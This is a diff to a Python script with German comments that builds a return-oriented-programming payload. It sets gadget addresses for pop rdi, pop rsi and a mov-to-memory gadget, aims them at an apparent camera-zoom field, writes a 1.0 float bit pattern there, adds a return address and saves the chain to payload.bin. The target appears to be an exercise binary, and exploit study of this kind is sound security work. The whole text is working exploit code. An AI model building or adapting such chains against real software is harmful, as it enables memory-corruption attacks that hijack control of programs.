@@ -18,6 +18,9 @@ pop_rsi_ret = 0x7626 + 0x555555554000
 # Gadget: mov dword ptr [rdi], esi ; ret
 mov_dword_ptr_rdi_esi_ret = 0x9c434 + 0x7ffff7600000
 
+exit_address = 0x3f19 + 0x555555554000
+afterSetZoom = 0x0000555555557f19
+
 # --- Zieladresse und zu setzender Wert ---
 # Adresse von theCamera->_zoom (Platzhalter, bitte anpassen)
 theCamera_zoom = 0x7fffffffd1c0
@@ -38,9 +41,11 @@ payload += p64(pop_rdi_ret)
 payload += p64(theCamera_zoom)  # rdi = Adresse von theCamera->_zoom
 payload += p64(dummy)           # Dummy für rbp
 payload += p64(pop_rsi_ret)
-payload += p32(value_1_0)         # rsi = Bitmuster 1.0
+payload += p64(value_1_0)         # rsi = Bitmuster 1.0
 payload += p64(dummy)           # Dummy für rbp
 payload += p64(mov_dword_ptr_rdi_esi_ret)
+
+payload += p64(afterSetZoom)
 
 # --- Payload in payload.bin speichern ---
 with open("payload.bin", "wb") as f:
